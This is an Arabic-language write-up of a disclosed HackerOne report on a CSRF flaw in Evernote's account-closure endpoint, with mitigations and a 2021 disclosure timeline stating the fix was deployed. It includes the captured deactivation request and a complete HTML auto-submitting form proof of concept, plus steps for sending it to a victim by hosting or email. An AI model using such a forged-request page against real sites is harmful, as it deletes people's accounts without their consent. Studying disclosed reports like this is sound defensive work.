# 🔥 ثغرة CSRF في Evernote: إلغاء الحساب بدون إذن 🔥

## 📌 المقدمة
الثغرة دي بتوضح مشكلة **CSRF (Cross-Site Request Forgery)** اللي بتسمح للمهاجم إنه يلغي حساب الضحية من **Evernote** من غير ما يكون عنده تصريح.

---

## 🛠 خطوات استغلال الثغرة

### 1️⃣ **إنشاء حسابين**
- 🏴‍☠️ **حساب المهاجم**: الحساب اللي هيتم تنفيذ الهجوم منه.
- 🎯 **حساب الضحية**: الحساب المستهدف بالهجوم.

### 2️⃣ **الدخول لصفحة إلغاء الحساب**
- يسجل المهاجم دخول لحسابه.
- يروح على اللينك ده:
  ```
  https://www.evernote.com/secure/CloseAccount.action
  ```

### 3️⃣ **التقاط الطلب باستخدام Burp Suite**
- شغل **Burp Suite** واعمل **intercept**.
- اضغط على **Deactivate your Evernote account**.
- اختار سبب الإلغاء وكمل العملية.
- الطلب اللي بيتبعت هيكون بالشكل ده:

```http
POST /secure/CloseAccount.action?accountAction=deactivateAccount&json=true HTTP/1.1
Host: www.evernote.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 202
Origin: https://www.evernote.com
Connection: close
Referer: https://www.evernote.com/secure/CloseAccount.action
Cookie: web50017PreUserGuid=03325c9c-10bb-4705-a4db-08fde2343592; ...
Sec-GPC: 1
password=&oneTimeCode=&captchaResponse=&reasons%5Banalytic%5D=specify-reason-different-app&reasons%5Bi18nKey%5D=CloseAccountAction.accountActionSurvey.differentApp&reasons%5Bchecked%5D=true&otherReason=
```

---

### 4️⃣ **تجهيز صفحة هجوم CSRF**
- خد الطلب اللي طلع من **Burp Suite** واعملي بيه صفحة HTML بالشكل ده:

```html
<html>
  <body>
    <script>history.pushState('', '', '/')</script>
    <form action="https://www.evernote.com/secure/CloseAccount.action?accountAction=deactivateAccount&json=true" method="POST">
      <input type="hidden" name="password" value="" />
      <input type="hidden" name="oneTimeCode" value="" />
      <input type="hidden" name="captchaResponse" value="" />
      <input type="hidden" name="reasons[analytic]" value="specify-reason-different-app" />
      <input type="hidden" name="reasons[i18nKey]" value="CloseAccountAction.accountActionSurvey.differentApp" />
      <input type="hidden" name="reasons[checked]" value="true" />
      <input type="hidden" name="otherReason" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

---

### 5️⃣ **إرسال الصفحة للضحية**
- المهاجم يرفع الصفحة على **موقع مستضيف** أو يبعتها للضحية في **إيميل**.
- لما الضحية يفتح الصفحة، الحساب بتاعه هيتقفل تلقائيًا.

---

## 🎯 **التأثير**
- 🛑 أي حد ممكن **يقفل حساب أي مستخدم** من غير ما يعرف.
- 💰 ممكن يتم **إلغاء حسابات البريميوم (Premium Accounts)** وبالتالي يحصل خسارة للمستخدمين.
- 🚨 تهديد كبير على **أمان وسُمعة Evernote**.

---

## 🔒 **الحلول المقترحة**
1️⃣ **استخدام CSRF Tokens** ✅
   - لازم يتم إضافة **CSRF Token** عشان يمنع تنفيذ الطلبات المشبوهة.
2️⃣ **التحقق من مصدر الطلب (Referer Header)** 🔍
   - الخادم يقبل الطلبات اللي جاية من **نطاق Evernote بس**.
3️⃣ **طلب إعادة التحقق من المستخدم** 🔑
   - يطلب من المستخدم **كلمة المرور أو كود تحقق** قبل ما يقفل الحساب.

---

## 🎖 **الجائزة والحل**
- الباحث **@sampritdas** اكتشف الثغرة وبلغ عنها على **HackerOne**.
- Evernote **اعترفت بالمشكلة وبدأت تصلحها**.
- الباحث حصل على **💰 $300 مكافأة**.

---

## 📜 **الجدول الزمني للإبلاغ**
- 📅 **10 مارس 2021**: إرسال التقرير.
- ✅ **11 مارس 2021**: تأكيد صحة الثغرة.
- 💰 **19 مارس 2021**: دفع المكافأة ($300).
- 🔧 **1 أبريل 2021**: نشر الإصلاح.
- 🌍 **19 أكتوبر 2021**: الإعلان عن الثغرة بشكل رسمي.

---

## 🔗 **مصادر إضافية**
- [📑 تقرير HackerOne](https://hackerone.com/reports/1121990)
- [🛡️ شرح CSRF](https://owasp.org/www-community/attacks/csrf)

---

🚀 **تم اكتشاف الثغرة بواسطة:** `sampritdas` | 🎯 **الموقع المتأثر:** Evernote
